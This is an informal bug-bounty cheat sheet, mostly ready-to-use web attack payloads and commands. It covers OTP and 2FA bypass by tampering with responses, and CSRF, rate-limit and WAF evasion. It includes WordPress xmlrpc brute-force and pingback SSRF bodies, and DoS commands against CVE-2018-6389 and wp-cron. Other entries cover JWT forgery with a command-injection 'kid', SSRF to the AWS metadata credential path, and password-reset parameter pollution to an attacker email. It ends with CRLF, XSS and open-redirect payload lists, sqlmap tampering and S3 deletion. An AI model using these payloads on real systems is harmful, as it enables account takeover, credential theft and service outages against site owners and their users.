- By sending a very long string (100000 characters) it’s possible to cause a denial a service attack on the server. This may lead to the website becoming unavailable or unresponsive. (test on password firleds, username, first name, email,address, text-area, comment section..) if you get 500 internal server error it is vulnerable.(This DoS attack falls under the Application Level DoS and not Network Level DoS so you can report it. In some company’s policy of Out-Of-Scope, you’ll find “Denial of Service” which means Network Level DoS and not Application Level DoS. If the company has stated that “Any kind of DoS” is Out-Of-Scope that means you can’t report either of them.)
- no text limitations for profile-picture name while uploading the profile-picture, these heavy text names can cause denial of service on different pages
- If you got ban from xyz.com  try to see other domain like forms etc where you need the same account to login. (if you succed then it's a bypass)
- for otp bypass, Register account with mobile number and request for OTP. Enter incorrect OTP and capture the request in Burpsuite. Do intercept response to this request and forward the request. response will be
{"verificationStatus":false,"mobile":9072346577","profileId":"84673832"} Change this response to
{"verificationStatus":true,"mobile":9072346577","profileId":"84673832"} And forward the response.You will be logged in to the account.
- another method to bypass OTP, intercept the request of entering a invalid otp and change the status code error to success.
- In response if "success":false, Change it to "success":true
- If Status Code is 4xx, Try to change it to 200 OK and see if it bypass restrictions
- Check the response of the 2FA Code Triggering Request to see if the code is leaked.
- Rare but some JS Files may contain info about the 2FA Code, worth giving a shot
- Sometimes Same 2FA code can be reused.
- Possible to brute-force any length 2FA Code
- Code for any user acc can be used to bypass the 2FA
- No CSRF Protection on disabling 2FA, also there is no auth confirmation
- 2FA gets disabled on password change/email change
- Bypassing 2FA by abusing the Backup code feature, Use the above mentioned techniques to bypass Backup Code to remove/reset 2FA restrictions
- Iframing the 2FA Disabling page and social engineering victim to disable the 2FA
- Enabling 2FA doesn't expire Previously active Sessions,If the session is already hijacked and there is a session timeout vuln
- Enter the code 000000 or null to bypass 2FA protection.
check for borkenlink hijacking vulnerabilities, manually and using blc tool, click external links on the target site ( For Example:- Some Links to Social Media Accounts or Some external Media Link), While Doing Manual work also put broken-link-checker in background using below Command interminal.
    blc -rof --filter-level 3 https://example.com/ , Ouput will be like Something.

    ─BROKEN─ https://www.linkedin.com/company/ACME-inc-/ (HTTP_999)
Now you need to check if company has the page or not , if no then register as the company or try to get that username or url. or you can use an alternate method using website like https://ahrefs.com/broken-link-checker and entering the domain.
- Old Session Does Not Expire After Password Change, create An account On Your Target Site then Login Into Two Browser With Same Account(Chrome, FireFox.You Can Use Incognito Mode As well). Change You Password In Chrome, On Seccessfull Password Change Referesh Your Logged in Account In FireFox/Incognito Mode. If you'r still logged in Then This Is a Bug.
- Session Hijacking (Intended Behavior): Create your account, Login your account, Use cookie editor extension in browser, Copy all the target cookies, Logout your account, Paste that cookies in cookie editor extension, Refresh page if you are logged in than this is a session hijacking.
- Password reset token does not expire (Insecure Configurability), request for a forget password token.Don't use that link, Instead log in with your old password and change your email to other. Now use that password link sents to old email and check if you are able to change your password if yes than there is the litle bug.
- Login to the application, Navigate around the pages htne logout, now press (Alt+left-arrow) buttons, if you are logged in or can view the pages navigated by the user. Then you found a bug. Impact: At a PC cafe, if a person was in a very important page with alot of details and logged out, then another person comes and clicks back (because he didnt close the browser) then data is exposed. User information leaked.
- First You need to make a account & You will receive a Email verification link.Log into the Application & I change the email Address to Email B.A Verification Link was Send & I verified that.Now I again Changed the email back to Email I have entered at the time of account creation. It showed me that my Email is Verified. Hence , A Succesful Email verfication Bypassed as I haven't Verified the Link which was sent to me in the time of account creation still my email got verified.Didn't Receive any code again for verification when I changed back my email & When I open the account it showed in my Profile that its Verified Email.Impact : Email Verfication was bypassed due to Broken Authentication Mechanism , Thus more Privileged account can be accessed by an attacker making website prone to Future Attacks.
- create an account and don't click on the verification link, instead change the email to a victim email and then go click the verification link, if the email gets confirmed then it's a bug(email verification bypass)
- Old Password Reset Token Not Expiring Upon Requesting New One (Sometimes P4).
- use wappalyzer, whatruns and buildwith to detect cms
- xmlrpc is one the most common issues in wordpress, to exploit it and to have it accepted you have to detect it first by sending a post request to the endpoint, send this body to listallmethods:
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
Check the pingback.ping mentod is there or not, so you can either perform ddos or ssrf(scan ports):
Perform DDOS

<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>

Perform SSRF (Internal PORT scan only)

<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
- you can automate xmlrpc exploitation using this tool XMLRPC-Scan
- Sometimes developers forget to disable the directory listing on /wp-content/uploads. So this is the common issue on wordpress sites.
- CVE-2018-6389 can down any Wordpress site under 4.9.3 So while reporting make sure that your target website is running wordpress under 4.9.3, Use the URL from my gist called loadsxploit, you will get a massive js data in response. To exploit it You can use any Dos tool i found Doser really fast and it shut down the webserver within 30 second. python3 doser.py -t 999 -g 'https://site.com/fullUrlFromLoadsxploit' (In WordPress through 4.9.2, unauthenticated attackers can cause a denial of service (resource consumption) by using the large list of registered .js files (from wp-includes/script-loader.php) to construct a series of requests to load every file many times. )
- CVE-2021-24364 The Jannah WordPress theme before 5.4.4 did not properly sanitize the options JSON parameter in its tie_get_user_weather AJAX action before outputting it back in the page, leading to a Reflected Cross-Site Scripting (XSS) vulnerability. Replace <Your_WP-Site-here> to your WP-site <Your_WP-Site-here>/wp-admin/admin-ajax.php?action=tie_get_user_weather&options=%7B%27location%27%3A%27Cairo%27%2C%27units%27%3A%27C%27%2C%27forecast_days%27%3A%275%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ecustom_name%27%3A%27Cairo%27%2C%27animated%27%3A%27true%27%7D
- visit site.com/wp-cron.php. You will see a Blank page with 200 HTTP status code. You can use the same tool Doser for exploiting this. python3 doser.py -t 999 -g 'https://site.com/wp-cron.php'
- This issue will only acceptable when target website is hiding their current users or they are not publically available. So attacker can use those user data for bruteforcing and other staff. visit site.com/wp-json/wp/v2/users/
You will see json data with user info in response.
- If you have xmlrpc.php and this User enumeration both presence there. Then you can chain them out by collecting username from wp-json and perform Bruteforce on them via xmlrpc.php. It will surely show some extra effort and increase the impact as well
- to perform a bruteforce attack , after listing the available methods, we needto make use of one method and send the request like this, and you  watch the size of the response to detet a successful login.
- <methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
now you can just send this to intruder and bruteforce away.
- If you mange to find the pingback.ping string ,then lets proceed and try and get a ping back on our server , you can use netcat , or python server , nodejs server , or even the apache logs anything you want. I’ll be using the nodejs http-server .
Start your server and send the following request in post data

    <methodCall>
    <methodName>pingback.ping</methodName>
    <params><param>
    <value><string>http://<YOUR SERVER >:<port></string></value>
    </param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
    </value></param></params>
    </methodCall>
	There are 2 thins to be filled here: 1) The link of your server. 2) link of some valid post from the wordpress site which is used to call the ping back. in the response if you get faultCode and a value greater then 0 (<value><int>17</int></value> )then it means the port is open+ you can verify this by checking your server logs.

- Drupal website: fuzz with intruder on '/node/$' where '$' is a number (from 1 to 500 for example). You could find hidden pages (test, dev) which are not referenced by the search engines.

- /wp-content/uploads/file-manager/log.txt leaking database creds and info
- you can identify moodle lms(learning management system) with wappalyzer or moodle.target.com or favicon, for shodan:    Search query: http.component:Moodle. Favicon Base: http.favicon.hash:-438482901

- just remove csrf token
- check if alice token is valid for bob, or if anonymous user token is valid for bob(token isn't linked to session)
- play with content-type tp bypass csrf,urlencoded form to json,json to urlencodedform,urlencodedform to multipart form
- switch POST to GET, server may skip csrf check for get requests
- php type juggling to bypass csrf, "csrf":0,
- Change Request Method [POST => GET]
-Remove Total Token Parameter
-Remove The Token, And Give a Blank Parameter
-Copy a Unused Valid Token , By Dropping The Request and Use That Token
-Use Own CSRF Token To Feed it to Victim
-Replace Value With Of A Token of Same Length 
-Reverse Engineer The Token
-Extract Token via HTML injection
-Switch From Non-Form `Content-Type: application/json` or `Content-Type: application/x-url-encoded` To `Content-Type: form-multipart`
-Change/delete the last or frist character from the token
-Change referrer to Referrer
-Bypass the regex
  If the site is looking for “bank.com” in the referer URL, maybe “bank.com.attacker.com” or “attacker.com/bank.com” will work.
-Remove the referer header (add this <meta name=”referrer” content=”no-referrer”> in your payload or html code)
-Clickjacking

  (If you aren’t familiar with clickjacking attacks, more information can be found https://owasp.org/www-community/attacks/Clickjacking.)
  Exploiting clickjacking on the same endpoint bypasses all CSRF protection. Because technically, the request is indeed originating from the legitimate site. If the page where   the vulnerable endpoint is located on is vulnerable to clickjacking, all CSRF protection will be rendered irrelevant and you will be able to achieve the same results as a CSRF   attack on the endpoint, albeit with a bit more effort.
	
- Check the caches of major search engines for publicly accessible sites
Authentication

- Find leaked email id, passwords using ‘We leak Info’ and ‘Hunter.io’
- Check for duplicate registration / Overwrite existing user
- Check for reuse exisintg usernames
- Overwrite default web application pages by specially crafted username registrations.⇒After registration,does your profile link appears something as www.tushar.com/tushar?, If so,enumerate default folders of web application such as/images,/contact,/portfoliob.Do a registration using the username such as images,contact,portfolioc.Check if those default folders have been overwritten by your profile link or not.
- When a user uploads an image in example.com, the uploaded image’s EXIF Geolocation Data does not gets stripped. As a result, anyone can get sensitive information of example.com users like their Geolocation, their Device information like Device Name, Version, Software & Software version used etc. 
- we can upload a file which looks like this something.php.jpg or somethings.jpg.php
- Bypassing the magic Byte validation via polyglots, so while we have to upload a JPEG file type we actaully can upload a PHAR-JPEG file which will appear to be a JPEg file type to the server while validating. the reason is the file PHAR-JPEg file has both the JPEG header and the PHP file also. so while uploading it didn’t get detected and later after processing the PHP file can be used to exploit.
- identify a waf: dig +short example.com .. curl -s https://ipinfo.io/IP | jq -r '.org'
- With AWS, you can often identify a load balancer with the presence of "AWSLB" and "AWSLBCORS" cookies
- Use https://dnsdumpster.com to generate a map. Next, make a search using Censys and save the IP's that look to match your target in a text file. Example: https://censys.io/ipv4?q=0x00sec.org.
- Another way you can find IP's tied to a domain is by viewing their historical IPs. You can do this with SecurityTrails DNS trails. https://securitytrails.com/domain/0x00sec.org/dns
- If you enumerate your targets DNS, you may find that they have something resembling a dev.example.com or staging.example.com subdomain, and it may be pointing to the source host with no WAF. 
- We an check ip for a host with this: 
for ip in $(cat ips.txt); do org=$(curl -s <https://ipinfo.io/$ip> | jq -r '.org'); title=$(timeout 2 curl --tlsv1.1 -s -k -H "Host: 0x00sec.org" <https://$ip/> | pup 'title text{}'); echo "IP: $ip Title: $title Org: $org"; done
    What we have now is a quick overview of which IP's respond to which Host header, and we can view the title
    We went through each host, requested the IP directly with the host header, and we have our source IP!
- The idea is to start your normal recon process and grab as many IP addresses as you can (host, nslookup, whois, ranges…), then check which of those servers have a web server enabled (netcat, nmap, masscan).
Once you have a list of web server IP, the next step is to check if the protected domain is configured on one of them as a virtual host
- Create your account. Edit your name to <h1>attacker</h1> or "abc><h1>attacker</h1> and save it.
    Request for a reset password and check your email. You will notice the <h1> tag getting executed
    HTML injection are usually considered as low to medium severity bugs but you can escalate the severity by serving a malicious link by using <a href> for eg: <h1>attacker</h1><a href="your-controlled-domain"Click here</a>
    You can redirect the user to your malicious domain and serve a fake reset password page to steal credentials Also you can serve a previously found XSS page and steal user cookies etc etc.. The creativity lies on you..
-  Headers to add:
 	X-Original-Url:
  	X-Forwarded-Server:
  	X-Host:
  	X-Forwarded-**Host**:
  	X-Rewrite-Url:
- If you come across /api.json in any AEM instance during bug hunting, try for web cache poisoning via following
Host: , X-Forwarded-Server , X-Forwarded-Host: and or simply try https://localhost/api.json HTTP/1.1
Also try Host: redacted.com.evil.com, Try Host: evil.com/redacted.com, Try this too Host: example.com?.mavenlink.com, Try Host: javascript:alert(1); Xss payload might result in debugging mode. 

- Host Header to Sqli
- Bypass front server restrictions and access to forbidden files and directories through X-Rewrite-Url/X-original-url: 
	curl -i -s -k -X 'GET' -H 'Host: <site>' -H 'X-rewrite-url: admin/login' 'https://<site>/'.
- Any Endpoint might be Vulnerable to HTTP Desync attack.
- Add parameters onto the endpoints for example, if there was GET /api_v1/messages --> 401 vs 
GET /api_v1/messages?user_id=victim_uuid --> 200
- HTTP Parameter pollution: GET /api_v1/messages?user_id=VICTIM_ID --> 401 Unauthorized
GET /api_v1/messages?user_id=ATTACKER_ID&user_id=VICTIM_ID --> 200 OK
- Add .json to the endpoint, if it is built in Ruby!
	/user_data/2341 --> 401 Unauthorized
	/user_data/2341.json --> 200 OK
- Test on outdated API Versions
	/v3/users_data/1234 --> 403 Forbidden
	/v1/users_data/1234 --> 200 OK
- Wrap the ID with an array.
	{“id”:111} --> 401 Unauthriozied
	{“id”:[111]} --> 200 OK
- Wrap the ID with a JSON object:
	{“id”:111} --> 401 Unauthriozied
	{“id”:{“id”:111}} --> 200 OK
- JSON Parameter Pollution:
	POST /api/get_profile
	Content-Type: application/json
	{“user_id”:<legit_id>,”user_id”:<victim’s_id>}
- Try to send a wildcard(*) instead of an ID. It’s rare, but sometimes it works.
- If it is a number id, be sure to test through a large amount of numbers, instead of just guessing
- If endpoint has a name like /api/users/myinfo, check for /api/admins/myinfo
- Replace request method with GET/POST/PUT
- Use burp extension autorize
- Lets say you find a low impact IDOR, like changing someone elses name, chain that with XSS and you have stored XSS!
- If you find IDOR on and endpoint, but it requires UUID, chain with info disclosure endpoints that leak UUID, and bypass this!
- use Jiralens tool to scan for JIRAs
- attack jwt by Changing alg to null, You can also use none,nOne,None,n0Ne; Note;;////--remove the signuature
- change user to admin
- Changing encrption RS256 to HS256, Signature not changes remove it or temper it
- Brute forcing the key in hs256 because it use same key to sign and verify means publickey=private key
- if you decoed jwt and find kid parameter, you can path traversal, 7) Change payload {"user":"admin"}
- jwt cat for weak secret token jwtcat
- Tool is used for validating, forging, scanning and tampering JWTs jwt_tool
- Test for user enumeration
- Check is you can list iteams from the bucket. aws s3 ls s3://<bucket name>
- If you are getting some errors then run this command aws s3 ls s3://<bucket name> --no-sign-request
- Try moving the files or deleting it and see if you are able to do that or not(in a bucket), If it is possible to move files then it is vulnerable and you can report it otherwise it is not vulnerable
- Delete files from the bucket. Command to delete the file into the bucket aws s3 rm test.txt s3://<bucket name>/test.txt (if that is present)
- When the admin console login page is working on a third party service,then just search for it's default credentials on Google
- Third Party service URL are of the format: https://target..com/login
- This bypass is used when you are forbidden to get access to admin login page, We use Header Injection for this bypass. `X-Orginal-URL: /admin` or `X-Rewrite-URL:/admin`,Use this Header under Host
- 1. Find JWT tokens:
		- We can use Regex to search in proxy history 
			"[= ]eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9._-]*"
			"[= ]eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*"
	2. Identify a test page
		- Find a request of the page with JWT token which gives clear reponse if valid Ok else other reponse
			Profile page is a good start
	3. Check that your test cases work
		- Send the request to repeater and check if same token works again else token might have expired
		- Now start testing different attacks.
- Change Payload section and Remove the Signature completely or try changing somecharacters in signature
- Crack the secret key
- Use Jwt_Tool to crack the secret key using below command:
			"python3 jwt_tool.py <JWT> -C -d secrets.txt"
			Now Use the Secret key to forge the request using jwt.io or jwt_tool with option "-p"
- You can try SQLi not only in kid but in any field of payload section.
		"python3 jwt_tool.py <JWT> -I -pc name -pv "admin' ORDER BY 1--" -S hs256 -k public.pem"
- manipulate kid with os commands payload.
	"kid: key.crt; whoami && python -m SimpleHTTPServer 1337 &"
- copy your profile link and then log out and clear cookies and then paste the link, a redirection should occur to login page with a link that has a redirection paramaeter such as login?next=/evil.vom':
	        https://samplesite.me/login?next=https://samplesite.me@evil.com/  #(to beat the bad regex filter)
	        also try to redirect to www.targetweb.com.attackersite.com
- bypass 2fa by: password reset, , no rate limit,sending all alphabets instead of numbers,status code manipulation,
- Many sites that support 2FA, have a “remember me” functionality. It is useful when the user doesn’t want to enter a 2FA code on subsequent login windows. And it is important to identify the way in which 2FA is “remembered”. This can be a cookie, a value in session/local storage, or simply attaching 2FA to an IP address.
- OTP Leakage in Response
- Bypassing 2fa Via OAuth mechanism ( Mostly not Applicable one )
	Site.com requests Facebook for OAuth token > Facebook verifies user account > Facebook send callback code > Site.com logs a user in (Rare case)
- to bypass rate limit: If the request goes on GET try to change it to POST, PUT, etc.,
    If you wanna bypass the rate-limit in API's try HEAD method.
    use these headers: 
   	 X-Forwarded-For: IP
		X-Forwarded-IP: IP
		X-Client-IP: IP
		X-Remote-IP: IP
		X-Originating-IP: IP
		X-Host: IP
		X-Client: IP

		#or use double X-Forwarded-For header
		X-Forwarded-For:
		X-Forwarded-For: IP

		Adding HTTP Headers to Spoof IP and Evade Detection

    These are Headers I've collected so far to Bypass Rate-Limits.

		X-Forwarded: 127.0.0.1
		X-Forwarded-By: 127.0.0.1
		X-Forwarded-For: 127.0.0.1
		X-Forwarded-For-Original: 127.0.0.1
		X-Forwarder-For: 127.0.0.1
		X-Forward-For: 127.0.0.1
		Forwarded-For: 127.0.0.1
		Forwarded-For-Ip: 127.0.0.1
		X-Custom-IP-Authorization: 127.0.0.1
		X-Originating-IP: 127.0.0.1
		X-Remote-IP: 127.0.0.1
		X-Remote-Addr: 127.0.0.1


- Adding Null Byte ( %00 ) at the end of the Email can sometimes Bypass Rate Limit.
- Try adding a Space Character after a Email. ( Not Encoded )
- Some Common Characters that help bypassing Rate Limit : %0d , %2e , %09 , %20 , %0, %00, %0d%0a, %0a, %0C
 - Adding a slash(/) at the end of api endpoint can also Bypass Rate Limit. domain.com/v1/login -> domain.com/v1/login/
- Request password reset to your email address, Click on the password reset link, Dont change password, Click any 3rd party websites(eg: Facebook, twitter), Intercept the request in burpsuite proxy, Check if the referer header is leaking password reset token.
- Sending an array of email addresses instead of a single email address. {“email_address”:[“admin@breadcrumb.com”,”attacker@evil.com”]}
- In case The password reset functionality of application is based on OTP validation.
  Many program accepts No rate limit as acceptable risk. So, Bruteforcing OTP is worth trying.
  You can reset the password of an account by intercepting the request for OTP validation and bruteforcing the 6 digit number.
  Using this, it is possible to change and reset the password of any account, by changing the user data and brute-forcing the reset OTP.
- 		1. email= victim@gmail.com&email=attacker@gmil.com
		2. email= victim@gmail.com%20email=attacker@gmil.com
		3. email= victim@gmail.com |email=attacker@gmil.com
		4. email= victim@gmail.com%0d%0acc:attacker@gmil.com
		5. email= victim@gmail.com&code= my password reset token
- Check github with company name for API keys or passswords.
- Enumerate the employees of the company from linkedin and twitter and check their repositories on github for sensitive information.
- Check source code of main website and subdomains for github links in the html comments or anywhere. Search using ctl-F and search for keyword github
- If you see directory with no slash at end then do these acts there
	site.com/secret => 403
	site.com/secret/* => 200
	site.com/secret/./ => 200
If you see file without any slash at end then do these acts there
	site.com/secret.txt => 403
	site.com/secret.txt/ => 200
	site.com/%2f/secret.txt/ => 200
	
	https://site.com/secret => 403
	http://site.com/secret => 200
- Header
	X-Forwarded-For: 127.0.0.1
- Check if you can use Password same as that of Email Address (weak password policy)
- Check if you can use Username same as that of Email Address (weak password policy)
- Try above mentioned when Resetting Password , Creating Account , Changing Password from Account Settings
- Check if you can use Password some Weak Passwords such as 123456, 111111 , abcabc , qwerty123
- Try above mentioned when Resetting Password , Creating Account , Changing Password from Account Settings
- Applications usually have Restrictions on Password while Creating Account, Make sure you check for both the cases when Resetting Password
- insert blind ssrf payload in Referer header
- AWS localhost is 169.254.169.254 so don't use 127.0.0.1 there!

- If you found an SSRF vulnerability that runs on EC2, try requesting :

		http://169.254.169.254/latest/meta-data/
		http://169.254.169.254/latest/user-data/
		http://169.254.169.254/latest/meta-data/iam/security-credentials/IAM_USER_ROLE_HERE
		http://169.254.169.254/latest/meta-data/iam/security-credentials/flaws/

- <os cmd>.collaborator.net 
- alert() Alternatives
   1)Use confirm() Not alert()
   2)Use prompt() Not alert()
   3)Use console.log() Not alert()
   4)use eval() Not alert()

- onerror Event Handler Alternatives
   1)Use onload
   2)Use onfocus
   3)Use onmouseover
   4)Use onblur
   5)Use onclick
   6)Use onscroll   
- if () get filtered then Use `` Rather then () , Some Examples Are Below.
   1)<script>alert`1`</script>
   2)<img src=x onerror=alert`1`>
   3)<img src=x onerror=prompt`1`>
   4)javascript:prompt`1`
   5)javascript:alert`1`
- searches for links that are inserted into the website and are under his control. Such links may be contained in a forum post, for example. Once he has found this kind of functionality, it checks that the link's rel attribute does not contain the value noopener and the target attribute contains the value _blank. If this is the case, the website is vulnerable to tabnabbing. (search for <a href="..." target="_blank" rel="" />  or <a href="..." target="_blank" />)
- Find Hidden Variables In Source Code.
- You can Manually Check Right Click View Page Source and search for var= , ="" , =''.
- duplicate (same email) signup, see if you access with the second password for the second account
- By sending a very long string (100000 characters) it’s possible to cause a denial a service attack on the server. This may lead to the website becoming unavailable or unresponsive. Usually this problem is caused by a vulnerable string hashing implementation. When a long string is sent, the string hashing process will result in CPU and memory exhaustion.(Click on enter and you’ll get 500 Internal Server error if it is vulnerable.)
- Payload for Username field : <svg/onload=confirm(1)>, Payload for Email field : “><svg/onload=confirm(1)>”@x.y
- No Rate Limit at Signup Page.a malicious users can generate hundreds and thousands of fake accounts that lead to fill the application DataBase with fake accounts, Which can impact the business in many ways.You can easily test for it with Burp Intruder.1. Capture the signup request and send it to Intruder.2. Add different emails as payload .
3. Fire up Intruder, And check whether it returns 200 OK.
- Insufficient Email Verification. application doesn’t verify the email id or the verification mechanism is too weak to be bypassed. You can easily Bypass Email Verification with some of the following common methods like:
    Forced Browsing. (directly navigating to files which comes after verifying the email)
    Response or Status Code Manipulation. (Replacing the bad response status like 403 to 200 can be useful)
- Path Overwrite.(check their profile with direct path /{username} always try to signup with system reserved file names, such as index.php, signup.php, login.php, etc. In some cases what happens here is, when you signup with username: index.php, now upon visiting target.tld/index.php, your profile will comeup and occupy the index.php page of an application)
- SQLmap’s ability to load tamper script rules to evade filters and WAF’s but what I didn’t know until a few months back was that you can use all of them in one line like so:
	sqlmap -u 'http://www.site.com:80/search.cmd?form_state=1’ --level=5 --risk=3 -p 'item1' --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords

- Test for authentication bypass
- Captcha bypasses:
	- Try change request method
	- Remove the captcha param from the request
	- leave param empty
	- Fill in random value
- Test for bruteforce protection
- WAF Bypass:
	 Base64 encoding our payload (/?q=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=_)
	 ASPX removes % not followed by two hex characters (https://site.com/index.php?%file=cat /etc/paswd)
	 We can use spaces to fool a WAF
	  Backslashes in filtered words (https://site.com/index.php?file=cat /etc/pa\swd)
	  Quotes and * https://site.com/index.php?file=cat /etc/pa*swd https://site.com/index.php?file=cat /etc/pa**swd https://site.com/index.php?file=cat /etc/pa's'wd https://site.com/index.php?file=cat /etc/pa"s"wd
	  Wildcards (https://site.com/index.php?file=cat /e??/p????)
	  Replace spaces with / (<svg/onload>)
	  Custom tags (https://acd91f8b1e2bae3781d35fe600c30081.web-security-academy.net/?search=<CUSTOM+id%3Dx+onfocus%3Dalert(document.cookie) tabindex=1>#x )
	  Using different language chars – e.g. ē instead of e
- use fofa.com and dogpile.com for osint 
- 
- Test password quality rules
- Test remember me functionality
- Test for autocomplete on password forms/input
- Test CAPTCHA
- Test multi factor authentication
- Test for logout functionality presence
- Test for cache management on HTTP (eg Pragma, Expires, Max-age)
- Test for default logins
- Test for user-accessible authentication history
- Test for out-of channel notification of account lockouts and successful password changes
- Test for consistent authentication across applications with shared authentication schema / SSO

- the filter will deleted this %09 character when checking the value parameter next in oauth which allow to attacker to bypass Filter and steal Oauth Token of user thats lead to account takeover !
- for any leaked and found api key use this repo https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/API%20Key%20Leaks
- By default the name of Amazon Bucket are like http://s3.amazonaws.com/[bucket_name]/, you can browse open buckets if you know their names
	http://s3.amazonaws.com/[bucket_name]/
	http://[bucket_name].s3.amazonaws.com/
	http://flaws.cloud.s3.amazonaws.com/
	https://buckets.grayhatwarfare.com/
- The term CRLF refers to Carriage Return (ASCII 13, \r) Line Feed (ASCII 10, \n)
- CRLF - Add a cookie:

		Requested page

		http://www.example.net/%0D%0ASet-Cookie:mycookie=myvalue

		HTTP Response

		Connection: keep-alive
		Content-Length: 178
		Content-Type: text/html
		Date: Mon, 09 May 2016 14:47:29 GMT
		Location: https://www.example.net/[INJECTION STARTS HERE]
		Set-Cookie: mycookie=myvalue

- CRLF - Add a cookie - XSS Bypass
		http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
		
		HTTP Response

		HTTP/1.1 200 OK
		Date: Tue, 20 Dec 2016 14:34:03 GMT
		Content-Type: text/html; charset=utf-8
		Content-Length: 22907
		Connection: close
		X-Frame-Options: SAMEORIGIN
		Last-Modified: Tue, 20 Dec 2016 11:50:50 GMT
		ETag: "842fe-597b-54415a5c97a80"
		Vary: Accept-Encoding
		X-UA-Compatible: IE=edge
		Server: NetDNA-cache/2.2
		Link: <https://example.com/[INJECTION STARTS HERE]
		Content-Length:35
		X-XSS-Protection:0

		23
		<svg onload=alert(document.domain)>
		0
- CRLF - Write HTML
		http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E

		HTTP response

		Set-Cookie:en
		Content-Length: 0

		HTTP/1.1 200 OK
		Content-Type: text/html
		Last-Modified: Mon, 27 Oct 2060 14:50:18 GMT
		Content-Length: 34

		<html>You have been Phished</html>
- CRLF - Filter Bypass

		Using UTF-8 encoding

		%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%28%29%E5%98%BE

		Remainder:

		    %E5%98%8A = %0A = \u560a
		    %E5%98%8D = %0D = \u560d
		    %E5%98%BE = %3E = \u563e (>)
		    %E5%98%BC = %3C = \u563c (<)

- Exploitation Tricks
		Try to search for parameters that lead to redirects and fuzz them
	    Also test the mobile version of the website, sometimes it is different or uses a different backend
- HPP allows an attacker to bypass pattern based/black list proxies or Web Application Firewall detection mechanisms. This can be done with or without the knowledge of the web technology behind the proxy, and can be achieved through simple trial and error.
- WAF - Reads first param,	Origin Service - Reads second param.
	In this scenario, developer trusted WAF and did not implement sanity checks.

	Attacker -- http://example.com?search=Beth&search=' OR 1=1;## --> WAF (reads first 'search' param, looks innocent. passes on) --> Origin Service (reads second 'search' param, injection happens if no checks are done here.)
- to identify which param is read by which technologie, refer to https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/HTTP%20Parameter%20Pollution

- Using CRLF to bypass "javascript" blacklisted keyword: java%0d%0ascript%0d%0a:alert(0)
- Using "//" & "////" to bypass "http" blacklisted keyword: //google.com, ////google.com
- Using "https:" to bypass "//" blacklisted keyword: https:google.com
- Using "//" to bypass "//" blacklisted keyword (Browsers see // as //): \/\/google.com/, /\/google.com/
- Using "%E3%80%82" to bypass "." blacklisted character: /?redir=google。com, //google%E3%80%82com
- Using null byte "%00" to bypass blacklist filter: //google%00.com
- Using parameter pollution: ?next=whitelisted.com&next=google.com
- Using "@" character, browser will redirect to anything after the "@": http://www.theirsite.com@yoursite.com/
- Creating folder as their domain: 
	http://www.yoursite.com/http://www.theirsite.com/
	http://www.yoursite.com/folder/www.folder.com
- Using "?" characted, browser will translate it to "/?":
	http://www.yoursite.com?http://www.theirsite.com/
	http://www.yoursite.com?folder/www.folder.com
- Host/Split Unicode Normalization: 
	https://evil.c℀.example.com . ---> https://evil.ca/c.example.com
	http://a.com／X.b.com
- XSS from Open URL - If it's in a JS variable: ";alert(0);//
- XSS from data:// wrapper
	http://www.example.com/redirect.php?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==
- XSS from javascript:// wrapper
	http://www.example.com/redirect.php?url=javascript:prompt(1)
- Common injection parameters
/{payload},?next={payload},?url={payload},?target={payload},?rurl={payload},?dest={payload},?destination={payload},?redir={payload},?redirect_uri={payload},?redirect_url={payload},?redirect={payload},/redirect/{payload},/cgi-bin/redirect.cgi?{payload},/out/{payload},/out?{payload},?view={payload},/login?to={payload},?image_url={payload},?go={payload},?return={payload},?returnTo={payload},?return_to={payload},?checkout_url={payload},?continue={payload},?return_path={payload}
- XPath Injection is an attack technique used to exploit applications that construct XPath (XML Path Language) queries from user-supplied input to query or navigate XML documents. Similar to SQL : "string(//user[name/text()='" +vuln_var1+ "' and password/text()=’" +vuln_var1+ "']/account/text())"
- DNS rebinding changes the IP address of an attacker controlled machine name to the IP address of a target application, bypassing the same-origin policy and thus allowing the browser to make arbitrary requests to the target application and read their responses.
- Most of the time the graphql is located on the /graphql or /graphiql endpoint.
- Check if errors are visible.
	?query={__schema}
	?query={}
	?query={thisdefinitelydoesnotexist}
- Enumerate Database Schema via Introspection
